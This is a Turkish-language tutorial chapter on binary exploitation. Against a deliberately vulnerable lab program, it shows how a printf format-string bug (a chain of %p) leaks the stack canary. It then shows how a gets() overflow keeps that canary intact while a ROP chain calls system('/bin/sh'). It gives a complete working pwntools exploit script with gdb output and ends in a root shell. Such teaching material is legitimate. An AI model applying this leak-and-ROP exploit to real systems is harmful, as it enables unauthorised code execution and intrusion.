# Hedefimiz
Önceki bölüm ile aynı hedefe sahibiz, programın akışını değiştirerek
bir shell çalıştırmak.

# Kod analizi
Önceki bölümdeki kod biraz daha modifiye edilmiş, hadi biraz daha yakından
inceleyelim:
```c
char name[40], answer[16];
```
Bu sefer iki farklı buffer'ımız var, ilk olarak önceki bölümlerde olduğu gibi
program ismimizi soruyor:
```c
puts("Hello, what's your name?");
gets(name);
```
Burda yine `gets()` kullanıldığından overflow mümkün. İsmimizi sorduktan sonra 
bu sefer ilginç birşey yapıyor, ismizi doğrulamamızı istiyor:
```c
printf(name);
printf("? [yes/no]\n");
```
Bu sorunun cevabı yine bir `gets()` çağrısı ile `answer` bufferına yazılıyor. Yine 
burda da overflow mümkün:
```c
gets(answer);
```
Son olarak program cevabımızın evet olup olmadığını kontrol ediyor, eğer cevabımız evetse
program önceki tanışma mesajını ekrana basıyor:
```c
if(strcmp(answer, "yes")==0)
    printf("Nice to meet you %s!\n", name);
```
Yani çok da birşey değilmiş değil, ilk başta name bufferını taşırıp önceki bölümdeki 
exploitimizi yeni buffer için azcık modifiye edip kullanabiliriz. Değil mi?

Eğer önceki bölümden dersinizi alıp `Makefile` dosyasını okuduysanız cevabı çoktan 
biliyorsunuz: Değil!

### Stack çerezleri
Önceki bölümden farklı olarak bu program derleme aşamasında `-fno-stack-protector` argümanını
kullanmıyor. Bu da demek ki "stack protector" bu program için aktif konumda. Bu bellek korumasını 
(önceki bölümdeki gibi) pwntools'un `checksec` aracı ile görüntüleyebilirsiniz:
```
root@o101:~/0x3# checksec ./0x3
[*] '/root/0x3/0x3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Peki bu bellek koruması tam olarak ne işe yarıyor?

**Stack smashing protector (SSP)**, **stack cookie** veya **stack canary**, caller tarafından stack frame'inin 
başına yerleştirilen rastgele bir (64 bit sistemlerde) 8 byte değerden ibaret. Yani bu değer `rbp` 
ve dönüş adresinden üstte (ya da stacki nasıl ele aldığınıza göre aşağıda). Bu demek oluyor ki dönüş 
adresine erişmek için bir önce bu adresin üzerine yazmalıyız.

> Eeee ne var bunda, altı üstü payload'ımıza 8 byte daha ekliyeceğiz?

Tüm olay da bu zaten. Dönüş adresine erişmek için çerezin üzerine yazmak **zorundayız.**

Program bu çerezin değerini kaydediyor ve de dönüş yapmadan önce gdb'de görüntüleyebileceğiniz 
bir karşılaştırma yaparak çerez eğer kaydedilen değeri korumuyor ise `__stack_chk_fail` fonksiyonunu
çağrırak programın çalışmasını `*** stack smashing detected ***: terminated` mesajı ile durduruyor:
```
0x0000000000401208 <+162>:   mov    rdx,QWORD PTR [rbp-0x8]
0x000000000040120c <+166>:   sub    rdx,QWORD PTR fs:0x28
0x0000000000401215 <+175>:   je     0x40121c <main+182>
0x0000000000401217 <+177>:   call   0x401040 <__stack_chk_fail@plt>
0x000000000040121c <+182>:   leave
0x000000000040121d <+183>:   ret
```
Bu mesajı asıl implementasyonda (gcc `libssp/ssp.c`) görüntüleyebiliriz:
```c
static void
fail (const char *msg1, size_t msg1len, const char *msg3)
{
...
  /* Try very hard to exit.  Note that signals may be blocked preventing
     the first two options from working.  The use of volatile is here to
     prevent optimizers from "knowing" that __builtin_trap is called first,
     and that it doesn't return, and so "obviously" the rest of the code
     is dead.  */
  {
    volatile int state;
    for (state = 0; ; state++)
      switch (state)
        {
        case 0:
          __builtin_trap ();
          break;
        case 1:
          *(volatile int *)-1L = 0;
          break;
        case 2:
          _exit (127);
          break;
        }
  }
}

void
__stack_chk_fail (void)
{
  const char *msg = "*** stack smashing detected ***: ";
  fail (msg, strlen (msg), "stack smashing detected: terminated");
}
```
Yine asıl implementasyona bakacak olursak bu çerez değerinin tamamen rastgele seçildiğini görebiliriz:
```c
static void __attribute__ ((constructor))
__guard_setup (void)
{
  unsigned char *p;

  if (__stack_chk_guard != 0)
    return;

#if defined (_WIN32) && !defined (__CYGWIN__)
...
#else
  int fd = open ("/dev/urandom", O_RDONLY);
  if (fd != -1)
    {
      ssize_t size = read (fd, &__stack_chk_guard,
                           sizeof (__stack_chk_guard));
      close (fd);
      if (size == sizeof(__stack_chk_guard) && __stack_chk_guard != 0)
        return;
    }

#endif
...
}
```
Bilmiyorsanız Linux (ve genel UNIX) sistemlerinde `/dev/urandom` bloklamayan yani esktra entropi 
için bekleme yapmayan rastgele veri okumaya yarıyor. Yani çerez tamami ile rastgele. Bu durumda 
SSP'yi atlatmamız nasıl mümkün?

Bunu yapmanın iki yolu var:
1. **Çerezi brute force etmek**: Bir program çalışma sırasında sadece bir kere rastgele çerez 
oluşturuyor. Bu gerçeği çerezi parça parça kırabileceğimiz gerçeği ile birleştirince aslında çerezi 
kaba kuvvet ile tahmin ederek kırmanın çok kolay olduğunu farkediyorsunuz. Tek sorun çerezi bir kere
hatalı deneyince programın çökmesi. Bu metodun çalışması için `fork()` gibi ekstra bir işlem oluşturan
bir programa ihtiyacımız var: `fork()` edilen işlemin çerezi parent ile aynı, ve fork edilen işlemin
çökmesi parent'ın çökmesine sebep olmaz.

Bu durumda elimizdeki kod `fork()` gibi bir fonksiyon kullanmıyor, o yüzden bu yöntemi kullanmamız 
mümkün değil. 

2. **Çerezi leaklemek**: Eğer stackden arbitary veri okuması gerçekleştirebilirsek, çerezin değerini 
leakleyebiliriz. Daha sonra çerezin değerini koruyarak aynı şekilde stack'e yazma yaparsak dönüş adresine 
`__stack_chk_fail`i tetiklemeden ulaşabiliriz.

Peki 2. yöntemi bu durumda nasıl uygulayabiliriz? Stackden veri okumamıza izin vericek bir arbitrary read 
(keyfi okuma) zafiyeti bu programda var mı ki?
```c
...
printf(name);
...
```
Ah! İşte burda :)

### Formatlanmış karakter dizeleri ve printf
`printf`in nasıl çalıştığını sanırım hepimiz biliyoruz, bir formatlanmış metin veriyoruz, ve argümanlara
göre `printf` bu metini formatlanmış şekilde ekrana basıyor.

Bu bilgi ile bana aşağıdaki kodun ne yapabileceğini söyleyebilir misiniz?
```c
pritnf("%s");
```
Formatlanmış bir metin ama formatlanma için gerekli karakter dizesi argüman olarak verilmemiş. **Bu durumda 
`printf` bir argüman var oldğunu varsayarak  bellekden arbitrary okuma yapacaktır**.

Bu koda bakıcak olursak `name` değişkenin `printf`e hangi argüman olarak verildiğine dikkat eddin:
```c 
printf(name);
```
`name` değişkeni formatlanmış metin olarak `printf`e geçiliyor. Doğru kullanımda olması gereken ise:
```c
printf("%s", name);
```
Bu durumda biz `name` değişkenini kontrol ettiğimizden `printf`in formatlamasını da kontrol edebiliriz.
Bunu az önce öğrendiğimiz bilgi ile birleştirirsek bellekden arbitrary okuma yapacaktır.

Yani programın ilk bölümünde `name` bufferına `printf` ile okuma yapmak için formatlanmış bir metin 
yazarak çerezi leakleyebilir, programın ikinci bölümünde ise answer bufferını taşırarak ve çerezi 
koruyarak dönüş adresinin üzerine yazarak programın akışını yöntebiliriz.

Hadi bunu pratiğe dökelim.

# Exploit 
Önce `printf` ile nasıl okuma yapabileceğimize bir bakalım:
```
root@o101:~/0x3# ./0x3
Hello, what's your name?
%d
4216497? [yes/no]
```
Güzel, bellekden rastgele bir değer okuduk, ancak çerezi seçebilmek adına daha iyi bir 
formatlama kullanabiliriz:
```
root@o101:~/0x3# ./0x3
Hello, what's your name?
%p
0x4056b1? [yes/no]
```
Şimdi biraz daha fazla okuma yapabiliriz, ancak buffer'ın uzunluğunun 40 olduğunu unutmayalım,
çok fazla karakter girersek istenmeyen bir overflowa sebep olabiliriz. 
```
root@o101:~/0x3# ./0x3
Hello, what's your name?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
0x4056b1(nil)0x7ffff7fb18e00x4056d9(nil)(nil)(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250xaa5096d3722361000x10x7ffff7dfecd00x7fffffffebc00x4011660x1004000400x7fffffffebd80x7fffffffebd8? [yes/no]
```
Yazabildiğimiz en uzun girdi ile aldığımız çıktı bu. İyi de burda çerezi nasıl bulacağız? Veya 
çerezi leaklediğimizi nerden bilebiliriz?

Bunun için gdb'de biraz inceleme yapabiliriz. Program yeni satırı koyduktan sonra bir breakpoint 
yerleştirebiliriz:
```
root@o101:~/0x3# gdb ./0x3
...
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
...
   0x0000000000401198 <+50>:    call   0x401070 <gets@plt>
   0x000000000040119d <+55>:    lea    rax,[rbp-0x30]
   0x00000000004011a1 <+59>:    mov    rdi,rax
   0x00000000004011a4 <+62>:    mov    eax,0x0
   0x00000000004011a9 <+67>:    call   0x401050 <printf@plt>
   0x00000000004011ae <+72>:    lea    rax,[rip+0xe68]        # 0x40201d
   0x00000000004011b5 <+79>:    mov    rdi,rax
   0x00000000004011b8 <+82>:    call   0x401030 <puts@plt>
   0x00000000004011bd <+87>:    lea    rax,[rbp-0x40]
...
(gdb) break *0x00000000004011bd
Breakpoint 1 at 0x4011b8
```
Şimdi programı çalıştırıp breakpoint'e ulaşınca stack'i incleyelim:
```
(gdb) run
Starting program: /root/0x3/0x3
...
Hello, what's your name?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
0x4056b1(nil)0x7ffff7fb18e00x4056d9(nil)(nil)(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x66873b1eca714a000x10x7ffff7dfecd00x7fffffffeb800x4011660x1004000400x7fffffffeb980x7fffffffeb98? [yes/no]

Breakpoint 4, 0x00000000004011bd in main ()
(gdb) x/24xg $rsp
0x7fffffffea40: 0x0000000000000000      0x0000000000000000
0x7fffffffea50: 0x7025702570257025      0x7025702570257025
0x7fffffffea60: 0x7025702570257025      0x7025702570257025
0x7fffffffea70: 0x7025702570257025      0x66873b1eca714a00
0x7fffffffea80: 0x0000000000000001      0x00007ffff7dfecd0
0x7fffffffea90: 0x00007fffffffeb80      0x0000000000401166
0x7fffffffeaa0: 0x0000000100400040      0x00007fffffffeb98
0x7fffffffeab0: 0x00007fffffffeb98      0x8783420280ac1eda
0x7fffffffeac0: 0x0000000000000000      0x00007fffffffeba8
0x7fffffffead0: 0x00007ffff7ffd000      0x0000000000403df0
0x7fffffffeae0: 0x787cbdfd558e1eda      0x787cadbd59a61eda
0x7fffffffeaf0: 0x0000000000000000      0x0000000000000000
```
Stacke bakarsak ilk farkettiğimiz şey `answer` buffer'ının sonradan tanımlanmış olmasına 
rağmen başta olması. Bu GCC'in yaptığı optimizasyonlardan biri. Sonrasında `name`
buffer'ını görüyoruz. `0x7025` hex formunda `%p` karakterine denk geliyor. Bundan sonra 
gelen rastgele bellek adresi işte bizim çerezimiz. Arkasından `rbp` ve dönüş değerimiz.

Çerezi aslında kolayca tanımanın bir yolu var. Başındaki `0x00` yani null termination karakterini
görüyor musunuz? Her çerez bu karakter ile başlıyor. Bunun amacı null termination'ın unutulduğu durumlarda
`strcpy` gibi fonksiyonlar istemeden çerezi leaklemesini engellemek.

Eğer leaklediğimiz veriye bakarsak, bu verinin çoğunun formatlanan metnin kendisinden ibaret olduğunu 
göreceğiz, ama dikkatli bakarsanız bu veri içinde çerezi görebilirsiniz:
```
Hello, what's your name?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
0x4056b1(nil)0x7ffff7fb18e00x4056d9(nil)(nil)(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025 !!0x66873b1eca714a00 !! 0x10x7ffff7dfecd00x7fffffffeb800x4011660x1004000400x7fffffffeb980x7fffffffeb98? [yes/no]
```
Şimdi hangi noktada çerezi leaklediğimize bakalım. Bunu sadece deneme yanılma yaparak bulabilirsiniz:
```
Hello, what's your name?
%p %p %p %p %p %p %p %p %p %p %p %p %p
0x4056b1 (nil) 0x7ffff7fb18e0 0x4056d7 (nil) (nil) (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x702520702520 0x3a6c1c66001cae00? [yes/no]
```
Bu durumda, 13. `%p` formatı ile çerezi leakliyoruz. Artık çerezi leakleyebildiğimize göre exploitin
diğer kısmına geçmeden önce tartışmamız gereken birşey var. 

Önceki bölümlerde kullandığımız `/tmp/ex` dosyasına exploiti yazan scriptimizin çalışmayacağını sanırım 
farkettiniz. Çerez programın çalışması sırasında leaklendiğinden bize dinamik olarak exploit için doğru 
payload'ı oluşturabilecek bir script lazım.

Bunun için programın IO'sunu (stdin, stdout, stderr) kontrol ederek önce çerezi leakleyen sonrada çerezi 
stdout'dan okuyup, payloadı oluşturup sonrada programa sağlıyacak bir script yazabiliriz, ama bu oldukça karmaşık 
ve de gereksiz olacaktır. Çünkü zaten bunu bizim için yapabilecek birşey var, pwntools!

### Basit bir şekilde pwntools 
pwntools scriptimizde, kolay bir şekilde zafiyetli binary'nin IO'sunu kontrol etmemizi ve 
payload oluşturmamızı sağlıyor.

pwntools'u kullanmak için ilk yapmamız gerek import etmek:
```python
from pwn import *
```
Sonrasında `context` yapısını düzenleyerek hedef binary, işletim sistemi ve mimarimizi belirtebiliriz:
```python
context.update(arch="amd64", os="linux")
context.binary = ELF("./0x3")
```
Şimdi de binary'i bir işlem olarak başlatıp belirli bir noktaya kadar IO'dan okuma yapabiliriz,
verimizi girmeden önce `Hello, what's your name?` çıktısına kadar ulaşmak istiyoruz. Bu durumda 
tek yapmamız gerek bu çıktının sonunda yer alan yeni satır karakterine kadar okuma yapmak:
```python
p = process("./0x3")

p.recvuntil(b"\n")
```
Sonrasında çerezi leaklemek için ilk girdimizi gönderelim ve de sıradaki satırı okuyalım. Bu satır 
evet/hayır sorsunu dolayısı ile de leakimizi içerecek. Her leaki boşluk karakteri ile ayırdığımızdan
en sonda bulunan çereze ulaşmak için biraz string manipülasyonu yapabiliriz:
```python
p.sendline(b"%p %p %p %p %p %p %p %p %p %p %p %p %p")
cookie = p.recvline().split()[12][:-1]
info(f"Leaked cookie: {cookie.decode()}")
```
Bundan sonra `answer` bufferına yazma yapacağımızdan şimdi asıl payloadımızı oluşturma zamanı.
Stack'i hatırlarsanız, `answer` buffer'ı `name` buffer'ından önce geliyor. O yüzden 16+40 
hesabından 56 karakter yazarak önce `answer` bufferını sonrada `name` bufferını doldurmamız lazım:
```python
payload  = b"A"*56              # answer + name
```
Şimdi sıra leaklediğimiz çerezi geri yazmada, bu çerez şuan byte formunda, `int()` fonksiyonu 
ile hex formuna çevirebiliriz:
```python
payload += p64(int(cookie, 16))
```
Şimdi de `rbp` ile karşı karşıyayız, buray rastgele birşey ile doldurup devam edebiliriz:
```python
payload += b"A"*8
```
Artık dönüş adresine geldik, önceki exploitimizi aynen kullanabiliriz, fakat `struct` modülü
ile değerleri farklı endian formlarına çevirmek yerine pwntools'un fonksiyonlarını kullanabiliriz:
```python
payload += p64(0x7ffff7dff265)  # pop rdi; ret
payload += p64(0x7ffff7f72e28)  # /bin/sh
payload += p64(0x7ffff7dff266)  # ret
payload += p64(0x7ffff7e26c30)  # system()
```
Son olarak payload'ı stdin'den programa gönderebiliriz, ardından `interactive` moduna geçerek 
stdin'i pwntools'dan devralabiliriz. Bu şekilde shell'i kontrol ediceğiz:
```python
p.sendline(payload)
p.interactive()
```
Tam exploit aşağıdaki gibi:
```python
from pwn import *

context.update(arch="amd64", os="linux")
context.binary = ELF("./0x3")
p = process("./0x3")

p.recvuntil(b"\n")
p.sendline(b"%p %p %p %p %p %p %p %p %p %p %p %p %p")
cookie = p.recvline().split()[12][:-1]
info(f"Leaked cookie: {cookie.decode()}")

payload  = b"A"*56              # answer + name
payload += p64(int(cookie, 16)) # cookie
payload += b"A"*8               # rbp
payload += p64(0x7ffff7dff265)  # pop rdi; ret
payload += p64(0x7ffff7f72e28)  # /bin/sh
payload += p64(0x7ffff7dff266)  # ret
payload += p64(0x7ffff7e26c30)  # system()

p.sendline(payload)
p.interactive()
```

Artık herşey hazır, exploitimizi test edebiliriz:
```
root@o101:~/0x3# python3 solve.py
[*] '/root/0x3/0x3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './0x3': pid 2401
[*] Leaked cookie: 0x2b0be40b82f08300
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

---
[Önceki](0x2.md) | [Sonraki](0x4.md)
